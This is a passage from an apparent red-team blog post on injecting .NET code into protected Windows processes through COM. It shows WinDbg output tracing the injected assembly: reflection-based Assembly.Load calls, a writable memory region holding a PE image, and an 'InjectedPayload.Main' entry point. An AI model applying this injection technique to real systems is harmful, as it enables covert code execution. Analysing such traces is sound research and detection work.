</span></span><span class="highlight-line"><span class="highlight-line-content">  Module Name<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">00007ff80dce4ad8            debug, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null  debug</span></span></code></pre></div><!--/$--><ul class="min-w-0 space-y-2 mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl page-api-block:ml-0"><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">DefaultDomain:</p></div></li></ul><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The DefaultDomain (address: 000001d900c57010) is where user-code and potentially the .NET unsigned code is loaded. In this domain, besides the standard mscorlib.dll assembly, there is also our targeted:</p><ul class="min-w-0 space-y-2 mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl page-api-block:ml-0"><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">assembly: Assembly: debug, Version=0.0.0.0, Culture=neutral, PublicKeyToken=<strong class="font-bold">null </strong></p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Module Name: <strong class="font-bold">debug </strong>(loaded at 00007ff80dce4ad8). </p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">This assembly is unusual, with its 0.0.0.0 version and no public key token, which is a red flag for malware or injected code.</p></div></li></ul><h3 id="debug-log" class="text-lg @xs:text-xl @lg:text-2xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.75em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/abusing-idispatch-for-trapped-com-object-access-and-injecting-into-ppl-processes#debug-log"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_lr8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_lr8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug">Debug Log</div></h3><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The .NET unsigned code  was identified through the <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">System.Reflection.Assembly.Load </code>method, which is commonly used to load assemblies from byte arrays. Here's part of the debug stack trace showing the reflection-based loading:</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_5v8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">0:008&gt; !clrstack<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">OS Thread Id: 0x1d18 OS Thread Id: 0x1d18 (8)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">(8)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        Child SP        Child SP                IP              IP  Call SiteCall Site<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">000000669647dc30 00007ffa975b6baf  System.Reflection.Assembly.Load(Byte[]) System.Reflection.Assembly.Load(Byte[])<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">000000669647de90 00007ffa98051673  [DebuggerU2MCatchHandlerFrame: 000000669647de90]<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">000000669647e108 00007ffa98051673  [HelperMethodFrame_PROTECTOBJ: 000000669647e108] System.RuntimeMethodHandle.InvokeMethod(System.Object, System.Object[], System.Signature, Boolean)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">000000669647e280 00007ffa96e2ef68  System.Reflection.RuntimeMethodInfo.UnsafeInvokeInternal(System.Object, System.Object[], System.Object[])<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">000000669647e2e0 00007ffa96e0aa16  System.Reflection.RuntimeMethodInfo.Invoke(System.Object, System.Reflection.BindingFlags, System.Reflection.Binder, System.Object[], System.Globalization.CultureInfo)</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">From this stack trace, we can see that the <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">System.Reflection.Assembly.Load</code> function is being invoked, which is a common technique for dynamically loading assemblies from raw byte arrays.</p><h3 id="memory-analysis" class="text-lg @xs:text-xl @lg:text-2xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.75em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/abusing-idispatch-for-trapped-com-object-access-and-injecting-into-ppl-processes#memory-analysis"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_m38qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_m38qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug">Memory Analysis</div></h3><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">By examining the memory regions where the malicious assembly is loaded, we can see that:</p><ul class="min-w-0 space-y-2 mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl page-api-block:ml-0"><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">The memory region has the <strong class="font-bold">PAGE_READWRITE </strong>protection, meaning it is writable, which is suspicious for code sections.</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start"> The size of the memory region (136 KB) aligns with the size of a small executable or DLL. </p></div></li></ul><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">This type of memory allocation is common in fileless attacks, where malicious code does not touch the disk but instead resides entirely in memory.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The <strong class="font-bold">MZ </strong>header found within the memory indicates that it is a PE file that may contain executable instructions. The presence of this PE header further indicates that an executable payload is active in memory.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The <strong class="font-bold">memory region details</strong> of the loaded malicious assembly are:</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_6f8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">0:008&gt; !address 0x00000214bec14020<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">Usage:                  &lt;unknown&gt;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">Base Address:           00000214`bec00000<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">End Address:            00000214`bec22000<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">Region Size:            00000000`00022000 ( 136.000 kB)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">State:                  00001000          MEM_COMMIT<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">Protect:                00000004          PAGE_READWRITE<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">Type:                   00020000          MEM_PRIVATE<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">Allocation Base:        00000214`bec00000<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">Allocation Protect:     00000004          PAGE_READWRITE<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content"></span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The Base Address is 0x00000214bec00000, and the region size is 136 KB, indicating that a PE file is located in this memory region.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The presence of <strong class="font-bold">PAGE_READWRITE</strong> protection indicates that the memory is writable, which is a typical sign of malicious code being injected or loaded into memory.</p><h3 id="investigating-the-malicious-assembly" class="text-lg @xs:text-xl @lg:text-2xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.75em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/abusing-idispatch-for-trapped-com-object-access-and-injecting-into-ppl-processes#investigating-the-malicious-assembly"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_ml8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_ml8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug">Investigating the Malicious Assembly</div></h3><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Here is part of the debug log showing the object dump for the byte array:</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_6p8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">0:008&gt; !DumpObj /d 00000214bec14020<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">Name:        System.Byte[]<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">MethodTable: 00007ffa96905848<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">Size:        10264(0x2818) bytes<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">Array:       Rank 1, Number of elements 10240, Type Byte<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">Content:     MZ......................@...............................................!..L.!This program cannot be run in DOS mode....$.......MZ......................@...............................................!..L.!This program cannot be run in DOS mode....$.......</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">As observed, the byte array contains an MZ header, which is a signature for PE files (commonly used in DLL or EXE files). This confirms that the loaded assembly is an executable.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">In order to observe the CLR stack trace during the execution of the injected .NET code, I used the <strong class="font-bold">sxe ld clrjit</strong> debugger command to enable debugging of the Just-In-Time (JIT) compiler. This command is used within the Windows debugger (WinDbg) to set a breakpoint that triggers whenever the clrjit module (which is responsible for JIT compiling .NET code) is loaded.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_6v8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">0:005&gt; !clrstack<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">OS Thread Id: 0x23f0 (5)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">        Child SP               IP Call Site<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">0000005faa9fc590 00007ffaea4908c4 [PrestubMethodFrame: 0000005faa9fc590] InjectedPayload..cctor()<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">0000005faa9fcb98 00007ffaea4908c4 [GCFrame: 0000005faa9fcb98] <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">0000005faa9fd720 00007ffaea4908c4 [PrestubMethodFrame: 0000005faa9fd720] InjectedPayload.Main()<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">0000005faa9fdaf0 00007ffaea4908c4 [DebuggerU2MCatchHandlerFrame: 0000005faa9fdaf0] <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">0000005faa9fdd68 00007ffaea4908c4 [HelperMethodFrame_PROTECTOBJ: 0000005faa9fdd68] System.RuntimeMethodHandle.InvokeMethod(System.Object, System.Object[], System.Signature, Boolean)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">0000005faa9fdee0 00007ffa96e2ef06 System.Reflection.RuntimeMethodInfo.UnsafeInvokeInternal(System.Object, System.Object[], System.Object[])<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">0000005faa9fdf40 00007ffa96e0aa16 System.Reflection.RuntimeMethodInfo.Invoke(System.Object, System.Reflection.BindingFlags, System.Reflection.Binder, System.Object[], System.Globalization.CultureInfo)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">0000005faa9fdfc0 00007ffa96e2aee2 System.Reflection.MethodBase.Invoke(System.Object, System.Object[])<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">0000005faa9fe000 00007ffa97568d8e DomainNeutralILStubClass.IL_STUB_COMtoCLR(System.StubHelpers.NativeVariant, IntPtr, IntPtr)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">0000005faa9fe1f0 00007ffa98051859 [ComMethodFrame: 0000005faa9fe1f0]</span></span></code></pre></div><!--/$--><ul class="min-w-0 space-y-2 mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl page-api-block:ml-0"><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">This shows the invocation of the Main method in your injected payload. The <strong class="font-bold">PrestubMethodFrame </strong>shows that the CLR is preparing to invoke this method. This is the entry point of the injected .NET payload that will execute the malicious actions.</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 